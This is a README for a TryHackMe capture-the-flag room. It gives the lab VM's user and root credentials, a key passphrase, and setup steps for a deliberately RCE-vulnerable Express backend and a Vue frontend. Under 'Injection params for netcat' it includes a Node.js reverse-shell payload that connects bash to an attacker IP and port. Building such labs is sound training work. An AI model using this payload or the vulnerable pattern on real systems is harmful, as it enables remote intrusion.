# thm_atdits
This repository holds or links to all the files needed to complete or recreate the TryHackMe room [AtDits](https://tryhackme.com/jr/atdits).

## Login Data for the VM
>User: paul  
>Password: SicheresPasswort

>User: root  
>Password: IchMagZuege!

>[Private Key](VM-Key/id_rsa) Passphrase  
>felix1


## Injection params for netcat
```
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```
## Short password list

The short [password list](passwordlist/rockyou.txt) is a list of around 200 passwords from the rockyou.txt list.  
It holds also the passophrase for the private key.

## VM
The VM is a Ubuntu Server 20.04 Image.  
It is in the `.ova` format and can be directly uploaded to TryHackMe.

File: [VM.ova](VM-Image/THM-ATdITS.ova)

## Backend
The backend is a simple NodeJS server with ExpressJS.
To run it, you need to have NodeJS installed.  
Then you can run `npm install` in the backend folder to install all the dependencies.
After that you can run `node app.js` to start the server.
The server will run on port 8080.

The server is based on this [example](https://github.com/appsecco/vulnerable-apps/tree/master/node-simple-rce) for RCE with ExpressJS.

## Frontend
The frontend is a VueJS app.
To run it, you need to have NodeJS installed.  
Then you can run `npm install` in the frontend folder to install all the dependencies.
After that you can run `npm run dev` to start the server.
The server will run on port 5173.

## Documentation
For further information, please read the [documentation](Documentation.md).